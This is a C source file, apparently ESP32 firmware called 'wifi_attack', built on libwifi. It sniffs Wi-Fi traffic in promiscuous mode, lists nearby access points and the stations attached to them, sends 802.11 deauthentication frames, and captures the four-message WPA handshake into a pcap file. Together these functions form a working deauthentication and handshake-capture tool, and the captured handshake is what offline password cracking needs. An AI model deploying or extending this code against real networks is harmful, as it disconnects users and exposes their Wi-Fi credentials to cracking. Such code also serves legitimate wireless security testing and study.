#include <stdio.h>
#include <strings.h>
#include <libwifi.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_log.h"
//#include "wifi_ieee80211.h"
#include "wifi_attack.h"
#include "../components/libpcap-esp32/libpcap_file_generator.h"

/*
* Static variables
*/
static const char* TAG = "WIFI_SNIFFER";
static unsigned char src_mac_filter[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }; 
static bool apply_filter = false;
static bool passive_scan = true;
static bool active_scan = false;
static bool monitor = false;
volatile bool hshake1 = false;
volatile bool hshake2 = false;
volatile bool hshake3 = false;
volatile bool hshake4 = false;

beacon_data_t scan_results[MAX_SCAN_RESULTS];
uint8_t current_scan_result = 0;
station_t assoc_station[MAX_STATION];
uint8_t current_station = 0;

/*
* This variable is used to store the HANDSHAKE MESSAGE M1 sender
* to ensure that other messager are from the same handshake sequence
*/
static unsigned char handshake_m1_sender[6] = { 0 };
struct libwifi_wpa_auth_data handshake[4] = { 0 };



void wifi_attack_init(void){
    wifi_country_t wifi_country = {
        .cc = "IT",
        .schan = 1,
        .nchan = 13,
        .policy = WIFI_COUNTRY_POLICY_AUTO
    };
    //RX INTERFACE SETUP
    ESP_ERROR_CHECK(esp_netif_init());
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
    ESP_ERROR_CHECK( esp_wifi_set_country(&wifi_country) ); /* set country for channel range [1, 13] */
    ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
    ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_APSTA));

    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
    esp_wifi_set_promiscuous(true);
    //TX INTERFACE SETUP
	wifi_config_t ap_config = {
		.ap = {
			.ssid = "ESPTool",
            .ssid_len = strlen("ESPTool"),
			.password = "123456789",
			.channel = 8,
			.authmode = WIFI_AUTH_WPA2_PSK,
			.ssid_hidden = 0,
			.max_connection = 4
		}
	};
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
}

int isEqual(unsigned char* addr1, unsigned char* addr2){
    return memcmp(addr1, addr2, 6) == 0;
}

void set_filter(unsigned char* mac)
{
    memcpy(&src_mac_filter, mac, sizeof(src_mac_filter));
    apply_filter = true;
}

void set_channel(uint8_t channel)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void set_filter_enable(unsigned char* mac, bool enable)
{
    memcpy(&src_mac_filter, mac, sizeof(src_mac_filter));
    apply_filter = enable;
}

void send_deauth_packet(unsigned char* receiver, unsigned char* transmitter, uint16_t reason_code, uint8_t n_packets)
{
    if(n_packets == 0){
        n_packets = 1;
    }
    struct libwifi_deauth deauth = {0};
    libwifi_create_deauth(&deauth, receiver, transmitter, transmitter, reason_code);
    int deauth_len = libwifi_get_deauth_length(&deauth);
    unsigned char *buf = malloc(deauth_len);
    int dump_len = libwifi_dump_deauth(&deauth, buf, deauth_len);
    for(int i = 0; i < n_packets; i++){
        esp_wifi_80211_tx(WIFI_IF_AP, buf, dump_len, false);
    }
    libwifi_free_deauth(&deauth);
}

void print_handshake_info(void)
{
    printf("\n################ GOT WPA HANDSHAKE! ################\n");

    for( uint8_t i = 0; i < 4; i++ )
    {
        printf("MESSAGE M%d!\n", i+1);
        printf("Version: %d\n", handshake[i].version);
        printf("Type: %d\n", handshake[i].type);
        printf("Length: %d\n", handshake[i].length);
        printf("#### KEY INFO #####\n");
        printf("Information: %d\n", handshake[i].key_info.information);
        printf("Key_length: %d\n", handshake[i].key_info.key_length);
        printf("Replay_counter: %lld\n", handshake[i].key_info.replay_counter);
        /* Print NONCE */
        printf("NONCE: ");
        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.nonce); a++ )
        {
            printf("%02X ", handshake[i].key_info.nonce[a]);
        }
        printf("\n");
        /* Print IV */
        printf("IV: ");
        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.iv); a++ )
        {
            printf("%02X ", handshake[i].key_info.iv[a]);
        }
        printf("\n");
        /* Print RSC */
        printf("RSC: ");
        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.rsc); a++ )
        {
            printf("%02X ", handshake[i].key_info.rsc[a]);
        }
        printf("\n");
        /* Print ID */
        printf("ID: ");
        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.id); a++ )
        {
            printf("%02X ", handshake[i].key_info.id[a]);
        }
        printf("\n");
        /* Print MIC */
        printf("MIC: ");
        for( uint8_t a = 0; a < sizeof(handshake[i].key_info.mic); a++ )
        {
            printf("%02X ", handshake[i].key_info.mic[a]);
        }
        printf("\n");

        printf("KEY DATA LENGTH: %d\n", handshake[i].key_info.key_data_length);
        /* Print key_data */
        printf("KEY_DATA: ");
        for( uint8_t a = 0; a < handshake[i].key_info.key_data_length; a++ )
        {
            printf("%02X ", handshake[i].key_info.key_data[a]);
        }
        printf("\n");
    }
    printf("################ END HANDSHAKE INFORMATION ################\n\n\n");
}

const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
    switch(type) {
        case WIFI_PKT_MGMT: return "MGMT";
        case WIFI_PKT_DATA: return "DATA";
    default:	
        case WIFI_PKT_MISC: return "MISC";
    }
}


//ISR SNIFFING HANDLER
IRAM_ATTR void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type)
{
    int has_radiotap = 0;
    struct libwifi_frame frame = {0};
    wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    /*
    * Check frame lenght
    */
    if (ppkt->rx_ctrl.sig_len < 100){
        return;
    }


    unsigned long data_len = ppkt->rx_ctrl.sig_len;
    int ret = libwifi_get_wifi_frame(&frame, (const unsigned char*)ppkt->payload, data_len, has_radiotap);
    if (ret < 0) {
        goto free_mem;
    }

    
    /*
    * Filter frames by MAC address
    */
    if( apply_filter == true ){
        if( !isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&src_mac_filter) && !isEqual(frame.header.mgmt_ordered.addr2, (unsigned char *)&src_mac_filter)){
            goto free_mem;
        }
    }


    /*
    * Data frame
    */
    if (frame.frame_control.type == TYPE_DATA) 
    {
        // Ensure the parsed data frame is a WPA handshake
        if (libwifi_check_wpa_handshake(&frame) > 0)
        {
            volatile int part = libwifi_check_wpa_message(&frame);  
            if(part == HANDSHAKE_M1){
                PCAPFILE *pfl = lpcap_create("/fat/pcap.pcap");
                /* Save handshake sender */
                memcpy(&handshake_m1_sender, &frame.header.mgmt_ordered.addr3, sizeof(frame.header.mgmt_ordered.addr3));
                hshake1 = true;
                libwifi_get_wpa_data(&frame, &handshake[0]);

                packet_t pkt = { 0 };
                memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
                pkt.p_len = data_len;
                packet_write_pcap(pfl, &pkt);
                lpcap_close_file( pfl );

            }else if( part == HANDSHAKE_M2 && hshake1 == true ){
                if( isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&handshake_m1_sender) )
                {
                    hshake2 = true;
                    libwifi_get_wpa_data(&frame, &handshake[1]);

                    packet_t pkt = { 0 };
                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
                    pkt.p_len = data_len;
                    packet_append_pcap(&pkt);
                }

            }else if( part == HANDSHAKE_M3 && hshake1 == true && hshake2 == true ){
                if( isEqual(frame.header.mgmt_ordered.addr2, (unsigned char *)&handshake_m1_sender) )
                {
                    hshake3 = true;
                    libwifi_get_wpa_data(&frame, &handshake[2]);

                    packet_t pkt = { 0 };
                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
                    pkt.p_len = data_len;
                    packet_append_pcap(&pkt);
                }

            }else if( part == HANDSHAKE_M4 && hshake1 == true && hshake2 == true && hshake3 == true ){
                if( isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&handshake_m1_sender) )
                {
                    hshake4 = true;
                    libwifi_get_wpa_data(&frame, &handshake[3]);
                    
                    packet_t pkt = { 0 };
                    memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
                    pkt.p_len = data_len;
                    packet_append_pcap(&pkt);
                }
            }

            if(hshake1 && hshake2 && hshake3 && hshake4){
                //print_handshake_info();
                ESP_LOGI(TAG, "PCAP Written!");
                ESP_LOGI(TAG, "Waiting for a beacon frame to complete...");
            }       
        }

        //GET STATION ASSOCIATED WITH AP IF FILTER IS ACTIVE
        if ( apply_filter == true && monitor == true){
            //If receiver address is equal to AP
            if( isEqual(frame.header.mgmt_ordered.addr1, (unsigned char *)&src_mac_filter) )
            {
                //Check if station is already present
                for( int st = 0; st < current_station; st++)
                {
                    if( isEqual(assoc_station[st].bssid, frame.header.mgmt_ordered.addr2) )
                    {
                        //Already present, increment frame counter for this station
                        assoc_station[st].frames++;
                        assoc_station[st].signal = ppkt->rx_ctrl.rssi;
                        goto free_mem;
                    }
                } 
                //Station not present, add it if array is not overflowed
                if( current_station < MAX_STATION ){
                    memcpy(&assoc_station[current_station].bssid, &frame.header.mgmt_ordered.addr2, sizeof(frame.header.mgmt_ordered.addr2));
                    assoc_station[current_station].frames = 1;
                    assoc_station[current_station].signal = ppkt->rx_ctrl.rssi;
                    current_station++;
                }               
            }
        }
        goto free_mem;
    }

    
    /*
    * Beacon frame
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_BEACON) {
        // Initalise a libwifi_bss struct and populate it with the data from the sniffed frame
        struct libwifi_bss bss = {0};
        ret = libwifi_parse_beacon(&bss, &frame);
        if (ret < 0) {
            libwifi_free_bss(&bss);
            goto free_mem;
        }   

        if(hshake1 && hshake2 && hshake3 && hshake4){
            hshake1 = false;
            hshake2 = false;
            hshake3 = false;
            hshake4 = false;
            packet_t pkt = { 0 };
            memcpy(&pkt.p_data, (const unsigned char*)ppkt->payload, data_len);
            pkt.p_len = data_len;
            packet_append_pcap(&pkt);
            ESP_LOGI(TAG, "BEACON FRAME WRITTEN!");
            vTaskDelay(999999 / portTICK_PERIOD_MS);
        } 

        if(passive_scan == true){
            if(current_scan_result < MAX_SCAN_RESULTS){
                //Check if bssid is already present in scan results array
                for(int i = 0; i < current_scan_result; i++){
                    if( isEqual((unsigned char *)&scan_results[i].bssid, (unsigned char *)&bss.bssid) ){
                        libwifi_free_bss(&bss);
                        goto free_mem;
                    }
                }
                //Ok questo beacon non è presente nei risultati
                memcpy(&scan_results[current_scan_result].bssid, &bss.bssid, sizeof(bss.bssid));
                strcpy((char *)&scan_results[current_scan_result].ssid, bss.hidden ? "(hidden)" : (char *)&bss.ssid);
                scan_results[current_scan_result].channel = bss.channel;
                scan_results[current_scan_result].signal = ppkt->rx_ctrl.rssi;
                scan_results[current_scan_result].wps = bss.wps;
                libwifi_get_security_type(&bss, scan_results[current_scan_result].encryption);
                libwifi_get_group_ciphers(&bss, scan_results[current_scan_result].group_chipers);
                libwifi_get_pairwise_ciphers(&bss, scan_results[current_scan_result].pairwise_chipers);
                libwifi_get_auth_key_suites(&bss, scan_results[current_scan_result].auth_key_suites);

                ESP_LOGI(TAG, "AP: %s\t%02X:%02X:%02X:%02X:%02X:%02X", scan_results[current_scan_result].ssid, scan_results[current_scan_result].bssid[0], scan_results[current_scan_result].bssid[1], scan_results[current_scan_result].bssid[2], scan_results[current_scan_result].bssid[3], scan_results[current_scan_result].bssid[4], scan_results[current_scan_result].bssid[5]);
                current_scan_result++;
            }
        }
        libwifi_free_bss(&bss);
        goto free_mem;
    }


    /*
    * Probe response
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_PROBE_RESP){
        struct libwifi_bss probe_resp = {0};
        ret = libwifi_parse_probe_resp(&probe_resp, &frame);
        if (ret < 0) {
            libwifi_free_bss(&probe_resp);
            goto free_mem;
        }

        if(active_scan == true){
            if(current_scan_result < MAX_SCAN_RESULTS){
                //Check if bssid is already present in scan results array
                for(int i = 0; i < current_scan_result; i++){
                    if( isEqual((unsigned char *)&scan_results[i].bssid, frame.header.mgmt_ordered.addr2) ){
                        libwifi_free_bss(&probe_resp);
                        goto free_mem;
                    }
                }
                //Ok questo beacon non è presente nei risultati
                /*memcpy(&scan_results[current_scan_result].bssid, frame.header.mgmt_ordered.addr2, sizeof(frame.header.mgmt_ordered.addr2));
                strcpy(&scan_results[current_scan_result].ssid, probe_resp.tags.hidden ? "(hidden)" : &probe_resp.ssid);
                scan_results[current_scan_result].channel = probe_resp.channel;
                scan_results[current_scan_result].signal = ppkt->rx_ctrl.rssi;
                current_scan_result++;*/
            }
        }
        libwifi_free_bss(&probe_resp);
        goto free_mem;
    }


    /*
    * Probe request
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_PROBE_REQ){
        struct libwifi_sta probe_req = {0};
        ret = libwifi_parse_probe_req(&probe_req, &frame);
        if (ret < 0) {
            libwifi_free_sta(&probe_req);
            goto free_mem;
        }

        libwifi_free_sta(&probe_req);
        goto free_mem;
    }


    /*
    * Association request 
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_ASSOC_REQ){
        struct libwifi_sta assoc_req = {0};
        ret = libwifi_parse_assoc_req(&assoc_req, &frame);
        if (ret < 0) {
            libwifi_free_sta(&assoc_req);
            goto free_mem;
        }

        libwifi_free_sta(&assoc_req);
        goto free_mem;
    }
    

    /*
    * Association response
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_ASSOC_RESP){
        struct libwifi_bss assoc_resp = {0};
        ret = libwifi_parse_assoc_resp(&assoc_resp, &frame);
        if (ret < 0) {
            libwifi_free_bss(&assoc_resp);
            goto free_mem;
        }

        libwifi_free_bss(&assoc_resp);
        goto free_mem;
    }


    /*
    * Reassociation request
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_REASSOC_REQ){
        struct libwifi_sta reassoc_req = {0};
        ret = libwifi_parse_reassoc_req(&reassoc_req, &frame);
        if (ret < 0) {
            libwifi_free_sta(&reassoc_req);
            goto free_mem;
        }

        libwifi_free_sta(&reassoc_req);
        goto free_mem;
    }


    /*
    * Reassociation response
    */
    if (frame.frame_control.type == TYPE_MANAGEMENT && frame.frame_control.subtype == SUBTYPE_REASSOC_RESP){
        struct libwifi_bss reassoc_resp = {0};
        ret = libwifi_parse_reassoc_resp(&reassoc_resp, &frame);
        if (ret < 0) {
            libwifi_free_bss(&reassoc_resp);
            goto free_mem;
        }

        libwifi_free_bss(&reassoc_resp);
        goto free_mem;
    }

free_mem:
    libwifi_free_wifi_frame(&frame);
    return;
}

bool mac_equal(const uint8_t* a, uint8_t* b){
    int n;
    for(n=0;n<6;n++){
        if(a[n]<b[n]){ return false;}
    }
    return true;
}

uint8_t SendDeauth(unsigned char* dest, unsigned char* source, int reasonCode){
    struct libwifi_deauth deauth = { 0 };
    libwifi_create_deauth(&deauth, dest, source, source, reasonCode );
    size_t deauth_len = libwifi_get_deauth_length(&deauth);

    unsigned char *deauth_dump = (unsigned char *)malloc(deauth_len);
    libwifi_dump_deauth(&deauth, deauth_dump, deauth_len);

    uint8_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_dump, deauth_len, false);
    libwifi_free_deauth(&deauth);
    free(deauth_dump);
    return ret;
}

/*
uint8_t SendAuth(uint8_t* dest, uint8_t* source){
    //HEADER
    AuthPacket.packet.header.protocol = 0;
    AuthPacket.packet.header.type = WIFI_PKT_MGMT;
    AuthPacket.packet.header.subtype = AUTHENTICATION;
    AuthPacket.packet.header.from_ds = 0;
    AuthPacket.packet.header.to_ds = 0;
    AuthPacket.packet.header.pwr_mgmt = 0;
    AuthPacket.packet.header.more_data = 0;
    AuthPacket.packet.header.more_frag = 0;
    AuthPacket.packet.header.strict = 0;
    AuthPacket.packet.header.wep = 0;
    AuthPacket.packet.header.retry = 0;
    AuthPacket.packet.header.duration = 314;
    //
    AuthPacket.packet.sequence_ctrl = 0;
    AuthPacket.packet.auth_alg  = OPEN_SYSTEM;
    AuthPacket.packet.auth_sequence = 1;
    AuthPacket.packet.status_code = 0;
    memcpy(AuthPacket.packet.sourceAddr, source, 6);
    memcpy(AuthPacket.packet.destAddr, dest, 6);
    memcpy(AuthPacket.packet.bssid, dest, 6);
    return esp_wifi_80211_tx(WIFI_IF_AP, AuthPacket.packetdata, sizeof(AuthPacket.packetdata)-2, false); 
}*/